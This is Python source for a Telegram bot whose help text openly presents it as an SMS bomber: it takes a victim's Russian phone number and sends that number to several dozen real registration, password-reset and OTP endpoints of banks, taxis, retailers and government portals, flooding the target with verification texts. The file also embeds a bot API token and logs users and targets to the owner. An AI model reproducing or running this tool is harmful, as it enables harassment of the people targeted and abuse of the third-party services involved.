# -*- coding: utf-8 -*-
import telebot, requests, random, datetime, sys, time, argparse, json, re, sqlite3
from telebot import types
bot = telebot.TeleBot("965521501:AAHYwmNj3gR4xbJTDH9HsZkme0kObgrwI3o")
owner = 355821673
def sleep(x):
	try:
		time.sleep(x)
	except:
		pass

db = sqlite3.connect("users.db")
dbs = db.cursor()

@bot.message_handler(commands=["ping"])
def ping(message):
	try:
		bot.send_message(message.chat.id, "<b>PONG</b>" , parse_mode="HTML")
	except:
		pass

@bot.message_handler(commands=["donate"])
def donate(message):
	try:
		bot.send_message(message.chat.id, "https://t.me/spymer/43")
	except:
		pass

@bot.message_handler(commands=["addwl"])
def addWL(message):
	try:
		if message.chat.id == owner:
			newtoper = f'{message.text[7:]}'
			if newtoper == '':
				bot.send_message(owner, "Введите номер телефона пользователя")
			else:
				newtoper = '7'+newtoper[1:]
				f = open('idWL.txt' , 'a')
				f.write(f'{newtoper}' + '\n')
				f.close()
				bot.send_message(owner, "Добавлен новый пользователь в белый лист: "+f'{newtoper}')
		else:
			bot.send_message(message.chat.id, "Доступно только админу")
	except:
		pass
		
@bot.message_handler(commands=['delwl']) 
def delwl(message):
	try:
		if message.chat.id == owner:
			iddelWL = f'{message.text[7:]}'
			with open("idWL.txt") as file:
				arrayWL = [row.strip() for row in file]
				if iddelWL == '':
					bot.send_message(owner, "Введите телефон, который надо удалить из Белого листа.")
				elif iddelWL in arrayWL:
					kkk = open('idWL.txt', 'r').read().replace(f'{iddelWL}', '')
					f = open('idWL.txt', 'w')
					f.write(kkk)
					f.close()
					bot.send_message(owner, 'Готово.')
				else:
					bot.send_message(owner, 'Такой юзер не найден')
		else:
			bot.send_message(message.chat.id, "Доступно только админу")
	except:
		pass

@bot.message_handler(commands=["addbl"])
def addbl(message):
	try:
		if message.chat.id == owner:
			newloser = f'{message.text[7:]}'
			if newloser == '':
				bot.send_message(owner, "Введите номер id пользователя")
			else:
				f = open('idBL.txt' , 'a')
				f.write(f'{newloser}' + '\n')
				f.close()
				bot.send_message(owner, "Добавлен новый пользователь в черный лист: "+f'{newloser}')
		else:
			bot.send_message(message.chat.id, "Доступно только админу")
	except:
		pass

@bot.message_handler(commands=['start']) 
def handle_start(message): 
	try:
		db = sqlite3.connect("users.db")
		dbs = db.cursor()
		dbs.execute("CREATE TABLE id"+f'{message.chat.id}'+" (phone text, count text)")
		bot.send_message(owner, "Новый пользователь: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nUsername: @"+f'{message.chat.username}'+"\niD: "+f'{message.chat.id}', parse_mode="HTML")
		bot.send_message(message.chat.id, 'Привет, ' + message.chat.first_name + '\nЯ бот от @FSystem88.\nОтправь мне номер телефона в формате 79xxxxxxxxx, чтобы начать СМС спам.\n\nВообще как бы сервисов много, но из-за того, что трафик проходит через VPN соединение (спасибо РКН за блокировку Telegram на территории РФ), то смсок доходит только около 17.\nБуду решать эту проблему.')
	except:
		pass
		
@bot.message_handler(commands=['help']) 
def handle_help(message): 
	try:
		bot.send_message(message.chat.id, 'Привет!\nОтправляешь боту номер телефона в формате 79xxxxxxxxx, а он спамит жертву.\nВсё просто!\nВсе вопросы к @FSystem88\nКанал: @spymer')
	except:
		pass

@bot.message_handler(commands=['delbl']) 
def delbl(message):
	try:
		if message.chat.id == owner:
			idunban = f'{message.text[7:]}'
			with open("idBL.txt") as file:
				arrayBL = [row.strip() for row in file]
				if idunban == '':
					bot.send_message(owner, "Введите id пользователя.")
				elif idunban in arrayBL:
					sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
					f = open('idBL.txt', 'w')
					f.write(sss)
					f.close()
					bot.send_message(owner, 'Готово.')
				else:
					bot.send_message(owner, 'Такого обьюзера не найдено')
		else:
			bot.send_message(message.chat.id, "Доступно только админу")
	except:
		pass
		
@bot.message_handler(func=lambda message: True, content_types=['text'])
def main(message):
	try:
	
		with open("idBL.txt") as file:
			arrayBL = [row.strip() for row in file]
		iduser = f'{message.chat.id}'
		if iduser in arrayBL:
			bot.send_message(message.chat.id, "Вы в черном листе!\nЕсли Вы считаете, что бан был получен случайно - обращайтесь к @FSystem88.\nВот Ваш id, он пригодится админу: <b>"+f'{message.chat.id}'+"</b>", parse_mode="HTML")
		else:
			with open("idWL.txt") as file:
				arrayWL = [row.strip() for row in file]
				_phone = message.text
				_phone = re.sub(r'[ ()--+]', '', _phone)
				if _phone[0] == '8':
					_phone = '7'+_phone[1:]
				if _phone[0] == '9':
					_phone = '7'+_phone

				if _phone in arrayWL:
					bot.send_message(message.chat.id, "Данный пользователь находится в белом списке.\nТы тоже можешь оказаться там, по всем вопросам писать @FSystem88.")
					bot.send_message(owner, "Пользователь <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a> пытался ввести номер "+_phone+".", parse_mode="HTML")
				elif _phone[0] == '7':
					bot.send_message(message.chat.id, "Запуск начался.\nPhone: +"+_phone)
					_text = 'Путин тебя любит ♥'
					_name = ''
					for x in range(12):
						_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					_phone9 = _phone[1:]
					_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
					_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
					_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
					_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
					_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
					iteration = 0
					_email = _name+f'{iteration}'+'@gmail.com'
					grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'})
					rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
					belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
					tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
					vkusvill = requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number': _phone9,'version': '2'}, headers={})
					karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
					uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={})
					taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
					dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
					tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
					worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={})
					wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
					mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
					ostin = requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin})
					ostin = requests.post('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp', params={'type': 'sendConfirmCode', 'phoneNumber': _phone})
					youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
					youdrive = requests.post('http://youdrive.today/signup/phone', data={'phone': _phone, 'phone_code':'7'})
					pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
					rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
					drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
					rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
					wifimetro = requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone})
					arambaa = requests.post('http://www.aramba.ru/core.php', data={'act': 'codeRequest', 'phone': '+'+_phone, 'l': _name, 'p': _name, 'name': _name, 'email': _name + '@gmail.com'})
					citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone, data={})
					dozarplati = requests.post('https://online-api.dozarplati.com/rpc', json={'id': 1, 'jsonrpc': '2.0', 'method': 'auth.login', 'params': {'phoneNumber': _phone}})
					fastmoney = requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'})
					findclone = requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
					pmsm = requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', json={'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
					smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _text,'phone': _phone})
					lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
					maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php', params={'send_code_again': 'Y', 'phone': _phone, 'email': _name+'@gmail.com', 'code_type': 'phone'})
					mcdonalds = requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
					oyorooms = requests.post('https://www.oyorooms.com/api/pwa/generateotp', params={'phone': _phone[1:], 'country_code': '+' + _phone})
					pswallet = requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': _phone, 'type': '0'})
					privetmir = requests.post('https://api-user.privetmir.ru/api/send-code', data={'approve1': 'on', 'approve2': 'on', 'checkApproves': 'Y', 'checkExist': 'Y','login': _phone, 'scope': 'register-user'})
					mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': _phone})
					newnext = requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
					optima = requests.post('https://online.optima.taxi/user/get-code', data={'phone': _phone})
					s7 = requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
					sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
					managevoximplant = requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
					voximplant = requests.post('https://api-ru-manage.voximplant.com/api/SendActivationCode',data={'phone': _phone, 'account_email': _name + '@gmail.com'})
					gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})
					loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={'login': _phone, 'attr': ''})
					alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
					invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
					onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
					psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
					raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
					beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
					utair = requests.post('https://b.utair.ru/api/v1/login/', json={"login":_phone})
					aresbank = requests.post('https://www.aresbank.ru/ajax/register.php', data={'REGISTER[NAME]': 'Иванов Иван Иванович','REGISTER[PERSONAL_PHONE]': _phoneAresBank,'REGISTER[LOGIN]': _name+f'{iteration}','REGISTER[PASSWORD]': _name+'-/'+_name,'REGISTER[CONFIRM_PASSWORD]': _name+'-/'+_name,'REGISTER[ACTION]': 'register','register_submit_button': 'Регистрация'})
					modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':_phone9,'Package':'optimal'})
					sfera = requests.post('https://sfera.ru/api/quiz/id', json={"phone":_phonePizzahut,"regno":"1021400692048"})
					bystrobank = requests.post('https://www.bystrobank.ru/publogin/web/register.php', data={'referer::-0':'','realm::-0':'bbpwd','loginName-0':_name,'password::-0':_name,'passwordRepeat::-0':_name,'phoneNumber::-0':_phone9,'ruPhoneCheck::-0':'true','email::-0':_email,'registration':'','serviceName-0':'lc'})
					bot.send_message(message.chat.id, "GOOD!")
				else: 
					bot.send_message(message.chat.id, "Я не понимаю тебя.\nОтправь мне номер телефона")
	except:
		bot.send_message(message.chat.id, "Спам закончен.")
		bot.send_message(owner, "Завершен спам:\nUser: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nPhone: "+_phone , parse_mode="HTML")

bot.polling()
